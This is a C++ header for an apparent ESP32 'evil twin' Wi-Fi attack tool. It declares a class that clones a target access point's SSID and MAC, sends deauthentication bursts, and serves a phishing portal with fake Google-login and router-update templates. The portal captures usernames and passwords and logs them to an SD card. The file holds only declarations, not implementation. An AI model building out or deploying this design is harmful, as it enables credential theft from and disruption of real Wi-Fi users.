#ifndef EVILTWIN_H
#define EVILTWIN_H

#include <Arduino.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "display_manager.h"
#include "sdcard_manager.h"

#define ET_LOG_PATH       "/logs/eviltwin.csv"
#define ET_PER_PAGE       8
#define ET_MAX_CREDS      20
#define ET_CREDS_PER_PAGE 5

struct CapturedCred {
    char user[48];
    char pass[48];
};

class EvilTwin {
public:
    EvilTwin(DisplayManager& dm, SDCardManager& sd);
    void start(const char* ssid);

private:
    DisplayManager& dm;
    SDCardManager&  sd;

    WebServer server;
    DNSServer dns;

    // portal state
    char  _ssid[33];
    int   _tmpl;          // 0=Google login  1=Router update
    int           _captureCount;
    char          _lastUser[48];
    char          _lastPass[48];
    CapturedCred  _creds[ET_MAX_CREDS];
    bool  _dirty;

    // client tracking (event-based — more reliable than softAPgetStationNum)
    WiFiEventId_t _evConn, _evDisc;

    // clone / deauth state
    bool     _isClone;
    bool     _targetIsOpen;   // true = open network, false = WPA/WPA2
    uint8_t  _targetBSSID[6]; // real AP MAC (used for deauth frames)
    uint8_t  _fakeMAC[6];     // actual MAC our AP uses (cloned or random)
    int      _targetChannel;
    bool     _deauthEnabled;
    uint32_t _deauthLastMs;
    int      _deauthCount;

    // SD custom template
    bool  _useCustomTemplate;
    char  _sdTemplatePath[64];
    char  _sdTemplateName[32];

    // -- setup UI --
    int  showModeMenu();
    bool doScanAndPick();
    void drawScanList(int total, int page);
    bool promptCustomSSID();
    bool askDeauth();
    bool pickSdTemplate();

    // -- portal handlers --
    void setupRoutes();
    void handleRoot();
    void handlePost();
    void handleRedirect();

    // -- runtime --
    void drawScreen();
    void sendDeauthBurst();
    void showCredsTable();
    void saveCredsToSD();
};

#endif // EVILTWIN_H
